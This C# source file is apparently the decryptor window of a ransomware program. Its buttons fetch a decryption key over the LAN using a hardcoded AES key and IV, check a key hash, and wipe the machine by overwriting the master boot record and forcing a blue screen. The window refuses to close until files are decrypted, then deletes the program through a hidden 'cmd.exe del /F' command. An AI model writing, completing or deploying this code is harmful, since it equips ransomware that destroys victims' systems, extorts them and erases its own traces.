using System;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using VortexSecOps.AesRsaCipherMix;
using VortexSecOps.HarmfulSysHacks;

namespace _Vortex_decryptor
{
    /// <summary>
    /// 密钥交换方式
    /// </summary>
    public enum KeyAcquisitionMethod
    {
        /// <summary>
        /// 通过局域网远程私钥包获取密钥
        /// </summary>
        RemotePrivateKeyPackageViaLan,
        /// <summary>
        /// 手动交换密钥
        /// </summary>
        ManualKeyExchange
    }
    public partial class Form1 : Form
    {
        public Form1()
        {
            // 初始化窗体组件
            InitializeComponent();
            // 为窗体关闭事件添加处理方法
            this.FormClosing += Form1_FormClosing;
        }
        // 静态引用当前窗体实例
        public static Form1 form1;
        // 存储私钥
        private static string _remoteAesKey;
        // 存储异步任务
        private static Task task;
        /// <summary>
        /// 文件是否被解密
        /// </summary>
        public static bool decryped = false;
        /// <summary>
        /// 密钥获取方式
        /// </summary>
        public static KeyAcquisitionMethod keyAcquisition;
        private static string _aesKey;
        public static string AesKey
        {
            get
            {
                // 返回 AES 密钥的克隆副本
                return _aesKey?.Clone().ToString();
            }
            set
            {
                // 设置 AES 密钥
                _aesKey = value;
            }
        }
        // 存储密钥
        private static string _key;
        public static string Key
        {
            get
            {
                // 返回密钥的克隆副本
                return _key?.Clone().ToString();
            }
            set
            {
                // 设置密钥
                _key = value;
            }
        }
        public static string RemoteAesKey
        {
            get
            {
                // 返回AES密钥的克隆副本
                return Convert.ToString(_remoteAesKey?.Clone());
            }
            set
            {
                // 设置AES密钥
                if (AesRsaEncryptionManager.GetSHA256(Convert.FromBase64String(value))==Program.keyHash256)
                {
                    _remoteAesKey = value; 
                }
                else
                {
                    throw new GetAesKeyException("AES密钥不匹配或包含错误");
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // 给静态窗体引用赋值
            form1 = this;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Computer Eradication
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            // 创建 Windows API 操作对象
            IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
            // 弹出确认对话框
            if (MessageBox.Show("你确定要打算放弃吗", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
            {
                // 修改主引导记录
                windowsAPIOperator.ModifyMasterBootRecord();
                // 触发蓝屏
                windowsAPIOperator.TriggerBlueScreen();
            }
        }

        /// <summary>
        /// Decrypt Now
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            // 如果文件已解密，禁用按钮并返回
            if (decryped == true)
            {
                button2.Enabled = false;
                return;
            }
            // 禁用按钮
            button2.Enabled = false;
            // 创建并显示解密窗体
            Form2 form2 = new Form2();
            form2.ShowDialog();
            // 启用按钮
            button2.Enabled = true;
        }

        /// <summary>
        /// Copy
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                // 将富文本框内容复制到剪贴板
                Clipboard.SetText(richTextBox2.Text);
            }
            catch (Exception) { }
        }

        /// <summary>
        /// Check
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void button4_Click(object sender, EventArgs e)
        {
            // 如果任务存在且未完成，提示用户并返回
            if (task != null)
            {
                if (!task.IsCompleted)
                {
                    MessageBox.Show("上一次的请求未完成", "无法获取信息", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
            // 禁用按钮
            button4.Enabled = false;
            // 启动异步任务
            task = Task.Run(async () =>
            {
                try
                {
                    // 将字符串转换为字节数组作为 AES 密钥
                    byte[] aesKey = Encoding.UTF8.GetBytes("tF3G7lW6DkP8N5vJ4hB2M0sR9yX1zQ6f");
                    // 将字符串转换为字节数组作为 AES 初始化向量
                    byte[] aesIv = Encoding.UTF8.GetBytes("8cDf4kG9Lh3N2pQ5");
                    // 创建 AES 密钥和初始化向量对象
                    AesKeyAndIv aesKeyAndIv = AesKeyAndIv.CreateNewAes(aesKey, aesIv);
                    // 异步获取 RSA 私钥包
                    var aesRandomKeyPack = await AesRsaEncryptionManager.GetRemoteAesKey(textBox1.Text, aesKeyAndIv, 3568);
                    if (aesRandomKeyPack != null)
                    {
                        keyAcquisition = KeyAcquisitionMethod.RemotePrivateKeyPackageViaLan;
                    }
                    // 存储AES密钥
                    RemoteAesKey = aesRandomKeyPack.AesKey;
                    // 将密钥显示在富文本框中
                    richTextBox2.Text = aesRandomKeyPack.Key;
                    // 存储密钥
                    Key = aesRandomKeyPack.Key;
                }
                catch (TimeoutException ex)
                {
                    // 超时异常处理，显示错误消息
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch (GetAesKeyException ex)
                {
                    // 获取 AES 密钥异常处理，显示错误消息
                    MessageBox.Show(ex.Message, "获取失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    richTextBox2.Text = string.Empty;
                    Key = string.Empty;
                }
                catch (Exception ex)
                {
                    // 其他异常处理，显示错误消息
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    richTextBox2.Text = string.Empty;
                    Key = string.Empty;
                }
            });
            // 延迟 1 秒
            await Task.Delay(1000);
            // 启用按钮
            button4.Enabled = true;
        }
        private void button5_Click(object sender, EventArgs e)
        {

        }
        private async void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // 如果没有解密
            if (decryped == false)
            {
                e.Cancel = true;
                this.Hide();
                await Task.Delay(5000);
                this.Show();
            }
            else
            {
                // 退出程序1秒钟之后删除自身
                ProcessStartInfo startInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    FileName = "cmd.exe",
                    Arguments = $"/C timeout/T 1 /NOBREAK&&del /F \"{Process.GetCurrentProcess().MainModule.FileName}\""
                };
                Process.Start(startInfo);
                e.Cancel = false;
                Environment.Exit(0);
            }
        }

        private void button5_Click_1(object sender, EventArgs e)
        {
            Form3 form3 = new Form3();
            form3.ShowDialog();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            button6.Enabled = false;
            if (textBox2.Text != null && textBox2.Text != string.Empty)
            {
                string keyHash;
                byte[] HashBytes = null;
                using (SHA256 hA256 = SHA256Cng.Create())
                {
                    try
                    {
                        StringBuilder builder = new StringBuilder();
                        HashBytes = hA256.ComputeHash(Convert.FromBase64String(textBox2.Text));
                        foreach (byte hashbyte in HashBytes)
                        {
                            builder.Append(hashbyte.ToString("x2"));
                        }
                        keyHash = builder.ToString();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        button6.Enabled = true;
                        return;
                    }
                }
                if (keyHash == Program.keyHash256 && Program.keyHash256 != null && Program.keyHash256 != string.Empty)
                {
                    keyAcquisition = KeyAcquisitionMethod.ManualKeyExchange;
                    Key = AesRsaEncryptionManager.Random_Key();
                    _aesKey = textBox2.Text;
                    richTextBox2.Text = Key;
                }
                else
                {
                    MessageBox.Show("哈希值不匹配或包含错误", "无法获取解密密钥", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            button6.Enabled = true;
        }
    }
}